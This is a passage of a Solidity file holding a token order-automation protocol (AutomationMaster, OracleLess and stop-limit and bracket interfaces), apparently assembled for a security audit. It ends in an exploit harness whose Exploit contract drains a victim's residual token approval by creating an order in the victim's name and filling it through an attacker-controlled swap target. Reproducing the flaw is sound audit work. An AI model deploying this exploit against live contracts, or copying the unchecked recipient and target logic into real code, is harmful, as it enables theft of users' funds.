   * @dev The input to this method should not be trusted, and the caller of the
   * method should not even be restricted to any single registry. Anyone should
   * be able call it, and the input should be validated, there is no guarantee
   * that the data passed in is the performData returned from checkUpkeep. This
   * could happen due to malicious keepers, racing keepers, or simply a state
   * change while the performUpkeep transaction is waiting for confirmation.
   * Always validate the data passed in.
   * @param performData is the data which was passed back from the checkData
   * simulation. If it is encoded, it can easily be decoded into other types by
   * calling `abi.decode`. This data should not be trusted, and should be
   * validated against the contract's current state.
   */
  function performUpkeep(bytes calldata performData) external;
}

// ============ automatedTrigger/IAutomation.sol ============


interface IAutomation is AutomationCompatibleInterface {
    ///@notice force a revert if the external call fails
    error TransactionFailed(bytes reason);

    ///@notice allow the AutomationMaster to determine what kind of order is being filled
    enum OrderType {
        STOP_LIMIT,
        BRACKET
    }

    ///@notice encode permit2 data into a single struct
    struct Permit2Payload {
        IPermit2.PermitSingle permitSingle;
        bytes signature;
    }

    ///@notice params for swap on limit order create
    ///@param swapTokenIn may or may not be the same as @param tokenOut
    ///@param swapAmountIn amount to swap
    ///@param swapSlippage raw bips of slippage allowed
    ///@param txData transaction data to be sent to the target to make the swap
    struct SwapParams {
        IERC20 swapTokenIn;
        uint256 swapAmountIn;
        address swapTarget;
        uint16 swapSlippage;
        bytes txData;
    }

    ///@notice standard return expected from checkUpkeep upkeep is needed
    ///@param orderType enum allow the AutomationMaster to determine what kind of order is being filled
    ///@param target address to send the transaction data to in order to perform the swap
    ///@param tokenIn token sold in the swap
    ///@param tokenOut token bought in the swap
    ///@param orderId unique id to associate the order
    ///@param pendingOrderIdx index of the pending order in the array
    ///@param slippage raw bips for the upcoming swap
    ///@param amountIn amount of @param tokenIn to sell
    ///@param exchangeRate current exchange rate of @param tokenIn => @param tokenOut
    ///@param txData transaction data to be sent to @param target to make the swap
    struct MasterUpkeepData {
        OrderType orderType;
        address target;
        IERC20 tokenIn;
        IERC20 tokenOut;
        uint96 orderId;
        uint96 pendingOrderIdx;
        uint16 slippage;
        uint256 amountIn;
        uint256 exchangeRate;
        bytes txData;
    }

    event OrderProcessed(uint96 orderId);
    event OrderCreated(uint96 orderId);
    event OrderModified(uint96 orderId);
    event OrderCancelled(uint96 orderId);
}

interface IAutomationMaster is IAutomation {
    function STOP_LIMIT_CONTRACT() external view returns (IStopLimit);
    function oracles(IERC20 token) external view returns (IPythRelay);
    function maxPendingOrders() external view returns (uint16);

    function getExchangeRate(
        IERC20 tokenIn,
        IERC20 tokenOut
    ) external view returns (uint256 exchangeRate);

    function generateOrderId(address sender) external view returns (uint96);

    function getMinAmountReceived(
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint96 slippageBips
    ) external view returns (uint256 minAmountReceived);

    function checkMinOrderSize(IERC20 tokenIn, uint256 amountIn) external view;
}

///@notice Stop Limit orders create a new bracket order once filled
/// the resulting bracket order will have the same unique order ID but will exist on the Bracket contract
interface IStopLimit is IAutomation {
    ///@notice StopLimit orders create a new bracket order once @param stopLimitPrice is reached
    ///@param stopLimitPrice execution price to fill the Stop Limit order
    ///@param takeProfit execution price for resulting Bracket order
    ///@param stopPrice execution price for resulting Bracket order
    ///@param amountIn amount of @param tokenIn to sell
    ///@param orderId unique id to associate the order
    ///@param tokenIn token sold in the swap
    ///@param tokenOut token bought in the swap
    ///@param recipient owner of the order and receiver of the funds once the order is closed
    ///@param feeBips optional fee, raw basis points, taken in @param tokenOut
    ///@param takeProfitSlippage raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param swapSlippage raw bips used to determine slippage for resulting swap if @param swapOnFill is true
    ///@param direction determines the expected direction of price movement
    ///@param swapOnFill determines if @param tokenIn is swapped for @param tokenOut once the Stop Limit order is filled
    struct Order {
        uint256 stopLimitPrice;
        uint256 takeProfit;
        uint256 stopPrice;
        uint256 amountIn;
        uint96 orderId;
        IERC20 tokenIn;
        IERC20 tokenOut;
        address recipient;
        uint16 feeBips;
        uint16 takeProfitSlippage;
        uint16 stopSlippage;
        uint16 swapSlippage;
        bool direction;
        bool swapOnFill;
    }

    ///@notice StopLimit orders create a new bracket order once filled
    ///@param stopLimitPrice execution price to fill the Stop Limit order
    ///@param takeProfit execution price for resulting Bracket order
    ///@param stopPrice execution price for resulting Bracket order
    ///@param amountIn amount of @param tokenIn to sell
    ///@param feeBips optional fee, raw basis points, taken in @param tokenOut
    ///@param tokenIn token sold in the swap
    ///@param tokenOut token bought in the swap
    ///@param recipient owner of the order and receiver of the funds once the order is closed
    ///@param takeProfitSlippage raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param swapSlippage raw bips used to determine slippage for resulting swap if @param swapOnFill is true
    ///@param swapOnFill determines if @param tokenIn is swapped for @param tokenOut once the Stop Limit order is filled
    ///@param permit is true if using permit2, false if using legacy ERC20 approve
    ///@param permitPayload encoded permit data matching the Permit2Payload struct
    ///@notice @param permitPayload may be empty or set to "0x" if @param permit is false
    function createOrder(
        uint256 stopLimitPrice,
        uint256 takeProfit,
        uint256 stopPrice,
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut,
        address recipient,
        uint16 feeBips,
        uint16 takeProfitSlippage,
        uint16 stopSlippage,
        uint16 swapSlippage,
        bool swapOnFill,
        bool permit,
        bytes calldata permitPayload
    ) external;

    ///@param orderId unique id to reference the order being modified
    ///@param stopLimitPrice new execution price to fill the Stop Limit order
    ///@param takeProfit new execution price for resulting Bracket order
    ///@param stopPrice new execution price for resulting Bracket order
    ///@param amountInDelta amount to either increase or decrease the position, depending on @param increasePosition
    ///@param tokenOut new token to be bought in the swap
    ///@param recipient new owner of the order and receiver of the funds once the order is closed
    ///@param takeProfitSlippage new raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage new raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param swapSlippage new raw bips used to determine slippage for resulting swap if @param swapOnFill is true
    ///@param swapOnFill determines if @param tokenIn is swapped for @param tokenOut once the Stop Limit order is filled
    ///@param permit is true if using permit2, false if using legacy ERC20 approve
    ///@param increasePosition true if adding to the position, false if reducing the position
    ///@notice @param permit & @param permitPayload are not referenced if @param increasePosition is false
    ///@param permitPayload encoded permit data matching the Permit2Payload struct
    ///@notice @param permitPayload may be empty or set to "0x" if @param permit is false
    function modifyOrder(
        uint96 orderId,
        uint256 stopLimitPrice,
        uint256 takeProfit,
        uint256 stopPrice,
        uint256 amountInDelta,
        IERC20 tokenOut,
        address recipient,
        uint16 takeProfitSlippage,
        uint16 stopSlippage,
        uint16 swapSlippage,
        bool swapOnFill,
        bool permit,
        bool increasePosition,
        bytes calldata permitPayload
    ) external;
}

interface IBracket is IAutomation {
    ///@notice Bracket orders are filled when either @param takeProfit or @param stopPrice are reached,
    /// at which time @param tokenIn is swapped for @param tokenOut
    ///@param takeProfit execution price for resulting Bracket order
    ///@param stopPrice execution price for resulting Bracket order
    ///@param amountIn amount of @param tokenIn to sell
    ///@param orderId unique id to associate the order
    ///@param tokenIn token sold in the swap
    ///@param tokenOut token bought in the swap
    ///@param recipient owner of the order and receiver of the funds once the order is closed
    ///@param feeBips optional fee, raw basis points, taken in @param tokenOut
    ///@param takeProfitSlippage raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param direction determines the expected direction of price movement
    struct Order {
        uint256 takeProfit; //defined by exchange rate of tokenIn / tokenOut
        uint256 stopPrice;
        uint256 amountIn;
        uint96 orderId;
        IERC20 tokenIn;
        IERC20 tokenOut;
        address recipient; //addr to receive swap results
        uint16 feeBips;
        uint16 takeProfitSlippage; //slippage if order is filled
        uint16 stopSlippage; //slippage of stop price is reached
        bool direction; //true if initial exchange rate > strike price
    }

    ///@notice Bracket orders are filled when either @param takeProfit or @param stopPrice are reached,
    /// at which time @param tokenIn is swapped for @param tokenOut    ///@param stopLimitPrice execution price to fill the Stop Limit order
    ///@param takeProfit execution price for resulting Bracket order
    ///@param stopPrice execution price for resulting Bracket order
    ///@param amountIn amount of @param tokenIn to sell
    ///@param feeBips optional fee, raw basis points, taken in @param tokenOut
    ///@param tokenIn token sold in the swap
    ///@param tokenOut token bought in the swap
    ///@param recipient owner of the order and receiver of the funds once the order is closed
    ///@param takeProfitSlippage raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param permit is true if using permit2, false if using legacy ERC20 approve
    ///@param permitPayload encoded permit data matching the Permit2Payload struct
    ///@notice @param permitPayload may be empty or set to "0x" if @param permit is false
    function createOrder(
        bytes calldata swapPayload,
        uint256 takeProfit,
        uint256 stopPrice,
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut,
        address recipient,
        uint16 feeBips,
        uint16 takeProfitSlippage,
        uint16 stopSlippage,
        bool permit,
        bytes calldata permitPayload
    ) external;

    ///@notice create a new Bracket order as a Stop Limit order is filled
    ///@notice @param existingOrderId allows the use of the same orderId for the resulting Bracket order
    function fillStopLimitOrder(
        bytes calldata swapPayload,
        uint256 takeProfit,
        uint256 stopPrice,
        uint256 amountIn,
        uint96 existingOrderId,
        IERC20 tokenIn,
        IERC20 tokenOut,
        address recipient,
        uint16 existingFeeBips,
        uint16 takeProfitSlippage,
        uint16 stopSlippage,
        bool permit,
        bytes calldata permitPayload
    ) external;

    ///@param orderId unique id to reference the order being modified
    ///@param takeProfit new execution price for resulting Bracket order
    ///@param stopPrice new execution price for resulting Bracket order
    ///@param amountInDelta amount to either increase or decrease the position, depending on @param increasePosition
    ///@param tokenOut new token to be bought in the swap
    ///@param recipient new owner of the order and receiver of the funds once the order is closed
    ///@param takeProfitSlippage new raw bips used to determine slippage for resulting Bracket order once @param takeProfit is reached
    ///@param stopSlippage new raw bips used to determine slippage for resulting Bracket order once @param stopPrice is reached
    ///@param permit is true if using permit2, false if using legacy ERC20 approve
    ///@param increasePosition true if adding to the position, false if reducing the position
    ///@notice @param permit & @param permitPayload are not referenced if @param increasePosition is false
    ///@param permitPayload encoded permit data matching the Permit2Payload struct
    ///@notice @param permitPayload may be empty or set to "0x" if @param permit is false
    function modifyOrder(
        uint96 orderId,
        uint256 takeProfit,
        uint256 stopPrice,
        uint256 amountInDelta,
        IERC20 tokenOut,
        address recipient,
        uint16 takeProfitSlippage,
        uint16 stopSlippage,
        bool permit,
        bool increasePosition,
        bytes calldata permitPayload
    ) external;
}

interface IOracleLess {
    event OrderCreated(uint96 orderId);
    event OrderCancelled(uint96 orderId);
    event OrderModified(uint96 orderId);
    event OrderProcessed(uint96 orderId);

    ///@notice force a revert if the external call fails
    error TransactionFailed(bytes reason);

    struct Order {
        uint96 orderId;
        IERC20 tokenIn;
        IERC20 tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient;
        uint16 feeBips;
    }

    function createOrder(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint16 feeBips,
        bool permit,
        bytes calldata permitPayload
    ) external returns (uint96);

    function cancelOrder(uint96 orderId) external;

    function modifyOrder(
        uint96 orderId,
        IERC20 _tokenOut,
        uint256 amountInDelta,
        uint256 _minAmountOut,
        address _recipient,
        bool increasePosition,
        bool permit,
        bytes calldata permitPayload
    ) external;

    function fillOrder(
        uint96 pendingOrderIdx,
        uint96 orderId,
        address target,
        bytes calldata txData
    ) external;
}


// ============ libraries/ArrayMutation.sol ============

library ArrayMutation {
    ///@param idx the element to remove from @param inputArray
    function removeFromArray(
        uint96 idx,
        uint96[] memory inputArray
    ) internal pure returns (uint96[] memory newList) {
        // Check that inputArray is not empty and idx is valid
        require(inputArray.length > 0, "inputArray length == 0");
        require(idx < inputArray.length, "index out of bounds");

        // Create a new array of the appropriate size
        newList = new uint96[](inputArray.length - 1);

        // Copy elements before the index
        for (uint96 i = 0; i < idx; i++) {
            newList[i] = inputArray[i];
        }

        // Copy elements after the index
        for (uint96 i = idx + 1; i < inputArray.length; i++) {
            newList[i - 1] = inputArray[i];
        }

        return newList;
    }
}


// ============ automatedTrigger/AutomationMaster.sol ============


///@notice This contract owns and handles all of the settings and accounting logic for automated swaps
///@notice This contract should not hold any user funds, only collected fees
contract AutomationMaster is IAutomationMaster, Ownable {
    using SafeERC20 for IERC20;

    ///@notice maximum pending orders that may exist at a time, limiting the compute requriement for checkUpkeep
    uint16 public maxPendingOrders;

    ///@notice minumum USD value required to create a new order, in 1e8 terms
    uint256 public minOrderSize;

    ///sub keeper contracts
    IStopLimit public STOP_LIMIT_CONTRACT;
    IBracket public BRACKET_CONTRACT;

    ///each token must have a registered oracle in order to be tradable
    mapping(IERC20 => IPythRelay) public oracles;
    mapping(IERC20 => bytes32) public pythIds;

    ///@notice register Stop Limit and Bracket order contracts
    function registerSubKeepers(
        IStopLimit stopLimitContract,
        IBracket bracketContract
    ) external onlyOwner {
        STOP_LIMIT_CONTRACT = stopLimitContract;
        BRACKET_CONTRACT = bracketContract;
    }

    ///@notice Registered Oracles are expected to return the USD price in 1e8 terms
    function registerOracle(
        IERC20[] calldata _tokens,
        IPythRelay[] calldata _oracles
    ) external onlyOwner {
        require(_tokens.length == _oracles.length, "Array Length Mismatch");
        for (uint i = 0; i < _tokens.length; i++) {
            oracles[_tokens[i]] = _oracles[i];
        }
    }

    ///@notice set max pending orders, limiting checkUpkeep compute requirement
    function setMaxPendingOrders(uint16 _max) external onlyOwner {
        maxPendingOrders = _max;
    }

    ///@param usdValue must be in 1e8 terms
    function setMinOrderSize(uint256 usdValue) external onlyOwner {
        minOrderSize = usdValue;
    }

    ///@notice sweep the entire balance of @param token to the owner
    ///@notice this contract should not hold funds other than collected fees,
    ///which are forwarded here after each transaction
    function sweep(IERC20 token) external onlyOwner {
        token.safeTransfer(owner(), token.balanceOf(address(this)));
    }

    ///@notice Registered Oracles are expected to return the USD price in 1e8 terms
    ///@return exchangeRate should always be in 1e8 terms
    function getExchangeRate(
        IERC20 tokenIn,
        IERC20 tokenOut
    ) external view override returns (uint256 exchangeRate) {
        return _getExchangeRate(tokenIn, tokenOut);
    }

    function _getExchangeRate(
        IERC20 tokenIn,
        IERC20 tokenOut
    ) internal view returns (uint256 exchangeRate) {
        // Retrieve USD prices from oracles, scaled to 1e8
        uint256 priceIn = oracles[tokenIn].currentValue();
        uint256 priceOut = oracles[tokenOut].currentValue();

        // Return the exchange rate in 1e8 terms
        return (priceIn * 1e8) / priceOut;
    }

    ///@notice generate a random and unique order id
    function generateOrderId(address sender) external view override returns (uint96) {
        uint256 hashedValue = uint256(
            keccak256(abi.encodePacked(sender, block.timestamp))
        );
        return uint96(hashedValue);
    }

    ///@notice compute minumum amount received
    ///@return minAmountReceived is in @param tokenOut terms
    ///@param slippageBips is in raw basis points
    function getMinAmountReceived(
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint96 slippageBips
    ) external view override returns (uint256 minAmountReceived) {
        uint256 exchangeRate = _getExchangeRate(tokenIn, tokenOut);

        // Adjust for decimal differences between tokens
        uint256 adjustedAmountIn = adjustForDecimals(
            amountIn,
            tokenIn,
            tokenOut
        );

        // Calculate the fair amount out without slippage
        uint256 fairAmountOut = (adjustedAmountIn * exchangeRate) / 1e8;

        // Apply slippage - 10000 bips is equivilant to 100% slippage
        return (fairAmountOut * (10000 - slippageBips)) / 10000;
    }

    ///@notice account for token scale when computing token amounts based on slippage bips
    function adjustForDecimals(
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut
    ) internal view returns (uint256 adjustedAmountIn) {
        uint8 decimalIn = ERC20(address(tokenIn)).decimals();
        uint8 decimalOut = ERC20(address(tokenOut)).decimals();

        if (decimalIn > decimalOut) {
            // Reduce amountIn to match the lower decimals of tokenOut
            return amountIn / (10 ** (decimalIn - decimalOut));
        } else if (decimalIn < decimalOut) {
            // Increase amountIn to match the higher decimals of tokenOut
            return amountIn * (10 ** (decimalOut - decimalIn));
        }
        // If decimals are the same, no adjustment needed
        return amountIn;
    }

    ///@notice determine if a new order meets the minimum order size requirement
    ///Value of @param amountIn of @param tokenIn must meed the minimum USD value
    function checkMinOrderSize(IERC20 tokenIn, uint256 amountIn) external view override {
        uint256 currentPrice = oracles[tokenIn].currentValue();
        uint256 usdValue = (currentPrice * amountIn) /
            (10 ** ERC20(address(tokenIn)).decimals());

        require(usdValue > minOrderSize, "order too small");
    }

    ///@notice check upkeep on all order types
    function checkUpkeep(
        bytes calldata
    )
        external
        view
        override
        returns (bool upkeepNeeded, bytes memory performData)
    {
        //check stop limit order
        (upkeepNeeded, performData) = STOP_LIMIT_CONTRACT.checkUpkeep("0x");
        if (upkeepNeeded) {
            return (true, performData);
        }

        //check bracket order
        (upkeepNeeded, performData) = BRACKET_CONTRACT.checkUpkeep("0x");
        if (upkeepNeeded) {
            return (true, performData);
        }
    }

    ///@notice perform upkeep on any order type
    function performUpkeep(bytes calldata performData) external override {
        //decode into masterUpkeepData
        MasterUpkeepData memory data = abi.decode(
            performData,
            (MasterUpkeepData)
        );

        //if stop order, we directly pass the upkeep data to the stop order contract
        if (data.orderType == OrderType.STOP_LIMIT) {
            STOP_LIMIT_CONTRACT.performUpkeep(performData);
        }

        //if stop order, we directly pass the upkeep data to the stop order contract
        if (data.orderType == OrderType.BRACKET) {
            BRACKET_CONTRACT.performUpkeep(performData);
        }
    }
}


// ============ automatedTrigger/OracleLess.sol ============

contract OracleLess is IOracleLess, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;
    AutomationMaster public immutable MASTER;
    IPermit2 public immutable permit2;

    uint96[] public pendingOrderIds;

    mapping(uint96 => Order) public orders;

    constructor(AutomationMaster _master, IPermit2 _permit2) {
        MASTER = _master;
        permit2 = _permit2;
    }

    ///@return pendingOrders a full list of all pending orders with full order details
    ///@notice this should not be called in a write function due to gas usage
    function getPendingOrders()
        external
        view
        returns (Order[] memory pendingOrders)
    {
        pendingOrders = new Order[](pendingOrderIds.length);
        for (uint96 i = 0; i < pendingOrderIds.length; i++) {
            Order memory order = orders[pendingOrderIds[i]];
            pendingOrders[i] = order;
        }
    }

    function createOrder(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint16 feeBips,
        bool permit,
        bytes calldata permitPayload
    ) external override returns (uint96 orderId) {
        //procure tokens
        procureTokens(tokenIn, amountIn, recipient, permit, permitPayload);

        //construct and store order
        orderId = MASTER.generateOrderId(recipient);
        orders[orderId] = Order({
            orderId: orderId,
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            amountIn: amountIn,
            minAmountOut: minAmountOut,
            recipient: recipient,
            feeBips: feeBips
        });

        //store pending order
        pendingOrderIds.push(orderId);

        emit OrderCreated(orderId);
    }

    function adminCancelOrder(uint96 orderId) external onlyOwner {
        Order memory order = orders[orderId];
        require(_cancelOrder(order), "Order not active");
    }

    function cancelOrder(uint96 orderId) external override {
        Order memory order = orders[orderId];
        require(msg.sender == order.recipient, "Only Order Owner");
        require(_cancelOrder(order), "Order not active");
    }

    function modifyOrder(
        uint96 orderId,
        IERC20 _tokenOut,
        uint256 amountInDelta,
        uint256 _minAmountOut,
        address _recipient,
        bool increasePosition,
        bool permit,
        bytes calldata permitPayload
    ) external override {
        _modifyOrder(
            orderId,
            _tokenOut,
            amountInDelta,
            _minAmountOut,
            _recipient,
            increasePosition,
            permit,
            permitPayload
        );
        emit OrderModified(orderId);
    }

    function fillOrder(
        uint96 pendingOrderIdx,
        uint96 orderId,
        address target,
        bytes calldata txData
    ) external override {
        //fetch order
        Order memory order = orders[orderId];

        require(
            order.orderId == pendingOrderIds[pendingOrderIdx],
            "Order Fill Mismatch"
        );

        //perform swap
        (uint256 amountOut, uint256 tokenInRefund) = execute(
            target,
            txData,
            order
        );

        //handle accounting
        //remove from array
        pendingOrderIds = ArrayMutation.removeFromArray(
            pendingOrderIdx,
            pendingOrderIds
        );

        //handle fee
        (uint256 feeAmount, uint256 adjustedAmount) = applyFee(
            amountOut,
            order.feeBips
        );
        if (feeAmount != 0) {
            order.tokenOut.safeTransfer(address(MASTER), feeAmount);
        }

        //send tokenOut to recipient
        order.tokenOut.safeTransfer(order.recipient, adjustedAmount);

        //refund any unspent tokenIn
        //this should generally be 0 when using exact input for swaps, which is recommended
        if (tokenInRefund != 0) {
            order.tokenIn.safeTransfer(order.recipient, tokenInRefund);
        }
    }

    function _cancelOrder(Order memory order) internal returns (bool) {
        for (uint96 i = 0; i < pendingOrderIds.length; i++) {
            if (pendingOrderIds[i] == order.orderId) {
                //remove from pending array
                pendingOrderIds = ArrayMutation.removeFromArray(
                    i,
                    pendingOrderIds
                );

                //refund tokenIn amountIn to recipient
                order.tokenIn.safeTransfer(order.recipient, order.amountIn);

                //emit event
                emit OrderCancelled(order.orderId);

                return true;
            }
        }
        return false;
    }

    function _modifyOrder(
        uint96 orderId,
        IERC20 _tokenOut,
        uint256 amountInDelta,
        uint256 _minAmountOut,
        address _recipient,
        bool increasePosition,
        bool permit,
        bytes calldata permitPayload
    ) internal {
        //fetch order
        Order memory order = orders[orderId];

        require(msg.sender == order.recipient, "only order owner");

        //deduce any amountIn changes
        uint256 newAmountIn = order.amountIn;
        if (amountInDelta != 0) {
            if (increasePosition) {
                //take more tokens from order recipient
                newAmountIn += amountInDelta;
                procureTokens(
                    order.tokenIn,
                    amountInDelta,
                    order.recipient,
                    permit,
                    permitPayload
                );
            } else {
                //refund some tokens
                //ensure delta is valid
                require(amountInDelta < order.amountIn, "invalid delta");

                //set new amountIn for accounting
                newAmountIn -= amountInDelta;

                //refund position partially
                order.tokenIn.safeTransfer(order.recipient, amountInDelta);
            }
        }

        //construct new order
        Order memory newOrder = Order({
            orderId: orderId,
            tokenIn: order.tokenIn,
            tokenOut: _tokenOut,
            amountIn: newAmountIn,
            minAmountOut: _minAmountOut,
            feeBips: order.feeBips,
            recipient: _recipient
        });

        //store new order
        orders[orderId] = newOrder;
    }

    function execute(
        address target,
        bytes calldata txData,
        Order memory order
    ) internal returns (uint256 amountOut, uint256 tokenInRefund) {
        //update accounting
        uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
        uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));

        //approve
        order.tokenIn.safeApprove(target, order.amountIn);

        //perform the call
        (bool success, bytes memory reason) = target.call(txData);

        if (!success) {
            revert TransactionFailed(reason);
        }

        uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
        uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));

        require(
            finalTokenOut - initialTokenOut > order.minAmountOut,
            "Too Little Received"
        );

        amountOut = finalTokenOut - initialTokenOut;
        tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
    }

    function procureTokens(
        IERC20 token,
        uint256 amount,
        address owner,
        bool permit,
        bytes calldata permitPayload
    ) internal {
        if (permit) {
            IAutomation.Permit2Payload memory payload = abi.decode(
                permitPayload,
                (IAutomation.Permit2Payload)
            );

            permit2.permit(owner, payload.permitSingle, payload.signature);
            permit2.transferFrom(
                owner,
                address(this),
                uint160(amount),
                address(token)
            );
        } else {
            token.safeTransferFrom(owner, address(this), amount);
        }
    }

    ///@notice apply the protocol fee to @param amount
    ///@notice fee is in the form of tokenOut after a successful performUpkeep
    function applyFee(
        uint256 amount,
        uint16 feeBips
    ) internal pure returns (uint256 feeAmount, uint256 adjustedAmount) {
        if (feeBips != 0) {
            //determine adjusted amount and fee amount
            adjustedAmount = (amount * (10000 - feeBips)) / 10000;
            feeAmount = amount - adjustedAmount;
        } else {
            return (0, amount);
        }
    }
}



// ============ Exploit harness (recipient-as-transferFrom-source token theft) ============
// Minimal real ERC20 for the opaque order tokens.
contract SynthToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory _n, string memory _s) { name = _n; symbol = _s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address s, uint256 a) external override returns (bool) { allowance[msg.sender][s] = a; emit Approval(msg.sender, s, a); return true; }
    function transfer(address to, uint256 a) external override returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; emit Transfer(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external override returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; emit Transfer(f, to, a); return true;
    }
}

// A victim who left a residual token approval to the protocol.
contract Victim {
    constructor(IERC20 token, address spender, uint256 amount) {
        token.approve(spender, amount);
    }
}

contract Exploit {
    OracleLess public oracleLess;
    AutomationMaster public master;
    SynthToken public tokenIn;
    SynthToken public tokenOut;
    Victim public victim;
    uint96 public orderId;
    uint256 public constant amountIn = 100e18;

    constructor() {
        master = new AutomationMaster();                                     // nonce 1
        oracleLess = new OracleLess(master, IPermit2(address(0)));           // nonce 2
        tokenIn = new SynthToken("Valuable", "VAL");                         // nonce 3
        tokenOut = new SynthToken("Worthless", "WORTH");                     // nonce 4
        victim = new Victim(tokenIn, address(oracleLess), amountIn);         // nonce 5

        // Victim holds 100e18 of the valuable token with a residual approval.
        tokenIn.mint(address(victim), amountIn);
        // Attacker owns a dust amount of the worthless token used to "settle".
        tokenOut.mint(address(this), 2);
    }

    function run() external {
        // 1) Create an order in the VICTIM's name; procureTokens pulls tokenIn from
        //    the recipient (victim), not from msg.sender (the attacker).
        orderId = oracleLess.createOrder(tokenIn, tokenOut, amountIn, 1, address(victim), 0, false, "");

        // 2) Fill the order routing the swap to this contract, taking the escrow.
        oracleLess.fillOrder(0, orderId, address(this), abi.encodeWithSelector(this.swap.selector));

        // Attacker now holds the victim's 100e18.
        require(tokenIn.balanceOf(address(this)) == amountIn, "theft failed");
    }

    // OracleLess.execute() approved us `amountIn` of tokenIn before this call.
    function swap() external {
        tokenIn.transferFrom(msg.sender, address(this), amountIn); // msg.sender == OracleLess
        tokenOut.transfer(msg.sender, 2);
    }
}
